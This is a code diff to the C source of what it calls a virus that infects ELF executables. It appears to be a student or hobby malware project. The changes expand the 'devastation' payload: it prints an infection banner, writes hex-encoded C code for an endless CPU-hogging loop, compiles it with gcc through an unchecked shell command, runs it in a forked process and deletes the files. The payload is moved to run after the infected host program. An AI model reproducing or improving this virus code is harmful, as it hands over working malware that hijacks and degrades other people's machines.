@@ -13,7 +13,7 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 18464
+#define SIZE 22648
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
@@ -26,9 +26,43 @@ static inline char* randomly_select_dir(char **dirs)
 }
 
 /* Execute malacious instructions */
-void devastation() {
-	const unsigned char banner[] = "Virus Text... ";
+void devastation(char *fileName) {
+	const unsigned char banner[] = "Haha.. Your computer has been infected\n";
 	write(1, (char *)banner, sizeof(banner));
+
+	//Malicious hexdump
+	char shellcode[] =
+        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
+	
+	char buf[200];
+	strcpy(buf,fileName);
+	strcat(buf,"_temp");
+	//write to a file.c in the same directory
+	char buf2[200];
+	strcpy(buf2,buf);
+	strcat(buf2,".c");
+	int temp_fd = creat(buf2, S_IWUSR | S_IRUSR);	
+	write(temp_fd, shellcode, 18);
+
+	//compile the file
+	char command[200]="gcc -w ";
+	strcat(command,buf2);
+	strcat(command," -o ");
+	strcat(command,buf);
+	system(command);
+	remove(buf2);
+	//fork ->
+	pid_t pid = fork();			
+	//1. Run the file
+	if(pid == 0) {
+		char *args[]={buf,NULL};
+        execvp(args[0],args);
+	}
+	//2. delete the file.c and file
+	else{
+		sleep(0.5);
+		remove(buf);
+	}
 }
 
 /* Returns true if the file's format is ELF (Executeable and Linkable Format)
@@ -189,7 +223,6 @@ void main(int argc, char *argv[]) {
 	int virus_fd = open(argv[0], O_RDWR);
     struct stat st;
 	fstat(virus_fd, &st);
-	devastation();
 	
 	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
 	if(cleanHostName != NULL) 
@@ -201,6 +234,7 @@ void main(int argc, char *argv[]) {
 	else
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
 	close(virus_fd);
+	devastation(argv[0]);
 }
 
 
